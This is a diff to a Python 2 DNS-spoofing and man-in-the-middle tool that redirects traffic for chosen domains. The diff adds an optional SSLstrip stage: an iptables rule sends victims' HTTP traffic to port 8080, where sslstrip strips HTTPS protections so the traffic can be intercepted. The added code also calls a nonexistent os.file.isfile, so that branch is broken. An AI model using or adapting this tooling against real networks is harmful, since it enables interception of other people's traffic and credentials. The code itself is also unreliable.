@@ -51,6 +51,7 @@ print("Examples: *.facebook.com will spoof all subdomains including www \n")
 print("If you want to spoof all websites you can use a wildcard by just typing *")
 print bcolors.ENDC
 print bcolors.OKGREEN
+
 target = raw_input('Input Source to spoof\n URL: ')
 print("Target address %s.") % target
 print bcolors.ENDC
@@ -74,6 +75,17 @@ print 'Done!'
 
 # Forward Traffic to WAN
 subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True).wait()
+
+# Enable SSLSTRIP
+ssl_strip_on = raw_input('Beta! Do you want to enable SSLSTRIP?\n y/n: ')
+if ssl_strip_on == 'y':
+    if os.file.isfile('/usr/bin/sslstrip'):
+        print('setting up iptables')
+        subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', '8080'])
+        print('starting sslstrip')
+        subprocess.call(['gnome-terminal', '-x', 'sslstrip', '-l', '8080'])
+    else:
+        print('Cant find SSLSTRIP, please make sure kalel\ncan locate it in /usr/bin/')
 
 # Forward Traffix
 print bcolors.WARNING
